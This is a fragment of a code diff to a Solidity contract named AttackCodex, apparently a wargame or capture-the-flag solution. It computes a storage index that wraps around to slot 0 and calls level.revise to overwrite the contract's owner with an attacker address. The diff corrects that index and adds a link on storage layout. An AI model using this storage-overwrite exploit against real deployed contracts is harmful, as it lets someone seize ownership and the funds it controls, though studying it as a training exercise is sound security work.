@@ -1,3 +1,5 @@
+// see https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/ for memory explanation
+
 // Slot 0 = 0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
 //         |      24 nibbles=12bytes |  40 nibbles = 20bytes                  |
 //         |      11bytes| boolean contacted |  20bytes owner                 |
@@ -40,10 +42,10 @@ contract AttackCodex {
         // slot number = uint256(keccak(1)) + N  = 0 
         // We need to overflow 2^256 
         // uint256(keccak(1)) + N = 2^256
-        // N = web3.utils.toBN('115792089237316195423570985008687907853269984665640564039457584007913129639936').sub(web3.utils.toBN(web3.utils.keccak256('0x1'))).toString()
-        // N = '72412505182528709039998379046085362850601968682154630550920834895083236163630'
+        // N = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(web3.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001'))).toString()
+        // N = '35707666377435648211887908874984608119992236509074197713628505308453184860938'
         
-        uint256 N = 72412505182528709039998379046085362850601968682154630550920834895083236163630;
+        uint256 N = 35707666377435648211887908874984608119992236509074197713628505308453184860938;
         bytes32 content = 0x000000000000000000000000935902bC8136E3477Bfc420f68CA98297196c1C1;
         level.revise(N, content);
     }    
